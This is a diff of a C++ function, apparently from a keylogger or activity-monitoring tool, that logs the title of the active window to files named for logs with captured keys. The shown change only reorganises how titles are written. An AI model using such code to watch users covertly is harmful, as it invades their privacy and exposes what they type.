@@ -50,21 +50,16 @@ void Application_History::update_window()
 {
 	std::string PL_window = "APLIKACJA: ";
 	std::string PL_no_active_window = "NIE MA AKTYWNEJ APLIKACJI";
+	
 	if (last_title != current_title)
 	{
 		std::string content;
-		
-		content = "\n\n" + PL_window;
-		save_to_file(applications_log, content);
-		save_to_file(applications_log_with_keys, content);
-		save_to_file(applications_log_with_clean_keys, content);
 
-#ifdef DEBUG
-		std::cout << content;
-#endif
-		if (current_title.empty())
-		{
-			content = PL_no_active_window;
+		if (current_title.empty() == false)
+		{	
+			content = "\n\n" + PL_window;
+			content.append("'" + current_title + "' \n");			
+			
 			save_to_file(applications_log, content);
 			save_to_file(applications_log_with_keys, content);
 			save_to_file(applications_log_with_clean_keys, content);
@@ -74,21 +69,15 @@ void Application_History::update_window()
 		}
 		else
 		{
-			content = "'" + current_title + "'";
-			save_to_file(applications_log, content);
-			save_to_file(applications_log_with_keys, content);
-			save_to_file(applications_log_with_clean_keys, content);
-#ifdef DEBUG
-			std::cout << content;
-#endif
+//			content = PL_no_active_window;
+//			save_to_file(applications_log, content);
+//			save_to_file(applications_log_with_keys, content);
+//			save_to_file(applications_log_with_clean_keys, content);
+//#ifdef DEBUG
+//			std::cout << content;
+//#endif
 		}
-		content = "\n";
-		save_to_file(applications_log, content);
-		save_to_file(applications_log_with_keys, content);
-		save_to_file(applications_log_with_clean_keys, content);
-#ifdef DEBUG
-		std::cout << content;
-#endif
+
 
 		last_title = current_title;
 	}
